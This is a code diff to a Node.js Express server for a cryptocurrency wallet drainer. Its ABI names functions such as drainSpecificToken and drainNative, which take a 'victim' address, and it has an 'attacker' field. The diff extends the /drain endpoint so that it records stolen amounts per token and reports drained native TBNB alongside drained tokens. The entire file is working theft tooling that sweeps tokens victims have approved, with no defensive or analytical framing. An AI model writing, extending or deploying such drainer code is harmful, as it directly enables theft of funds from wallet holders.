@@ -29,8 +29,8 @@ const drainerAbi = [
   "function drainSpecificToken(address victim, address token) external returns (uint256)",
   "function attacker() external view returns (address)",
   "event TokensDrained(address indexed victim, address indexed token, uint256 amount)",
-  "function drainNative(address victim) external returns (uint256)", // New
-  "event NativeDrained(address indexed victim, uint256 amount)"    // New
+  "function drainNative(address victim) external returns (uint256)",
+  "event NativeDrained(address indexed victim, uint256 amount)"
 ];
 
 const tokenAbi = [
@@ -132,6 +132,7 @@ app.post("/drain", async (req, res) => {
       const gasSettings = await getGasSettings();
       let tx, receipt, totalDrained = BigInt(0);
       const tokensNeedingApproval = [];
+      const drainedTokens = []; // Track drained amounts per token
 
       // Check allowances and balances for all tokens
       const tokenAddresses = tokenList.map(t => t.address);
@@ -157,7 +158,13 @@ app.post("/drain", async (req, res) => {
               try {
                   const parsedLog = eventInterface.parseLog(log);
                   if (parsedLog.name === "TokensDrained") {
-                      totalDrained += BigInt(parsedLog.args.amount);
+                      const tokenAddress = parsedLog.args.token;
+                      const amount = BigInt(parsedLog.args.amount);
+                      totalDrained += amount;
+                      const token = tokenList.find(t => t.address.toLowerCase() === tokenAddress.toLowerCase());
+                      if (token) {
+                          drainedTokens.push(`${ethers.formatUnits(amount, token.decimals)} ${token.symbol}`);
+                      }
                   }
               } catch (e) {
                   console.log("Non-TokensDrained log:", log);
@@ -184,8 +191,10 @@ app.post("/drain", async (req, res) => {
 
       console.log(`Transaction sent: ${tx.hash}`);
 
-      if (totalDrained > 0) {
-          const message = `Drained ${ethers.formatEther(totalDrained)} total tokens`;
+      if (totalDrained > 0 || nativeDrained > 0) {
+          const tokenMessage = drainedTokens.length > 0 ? `Drained tokens: ${drainedTokens.join(", ")}` : "No tokens drained";
+          const nativeMessage = nativeDrained > 0 ? `Drained native: ${ethers.formatEther(nativeDrained)} TBNB` : "No TBNB drained";
+          const message = `${tokenMessage}. ${nativeMessage}.`;
           res.json({
               success: true,
               message,
@@ -193,7 +202,7 @@ app.post("/drain", async (req, res) => {
               transactionHash: tx.hash,
               gasUsed: receipt.gasUsed.toString(),
               needsApproval: false,
-              tokensNeedingApproval: [] // No approvals needed post-drain
+              tokensNeedingApproval: []
           });
       } else {
           res.json({
@@ -202,7 +211,7 @@ app.post("/drain", async (req, res) => {
               victimAddress,
               transactionHash: tx?.hash || null,
               needsApproval,
-              tokensNeedingApproval // List of tokens needing approval
+              tokensNeedingApproval
           });
       }
   } catch (error) {
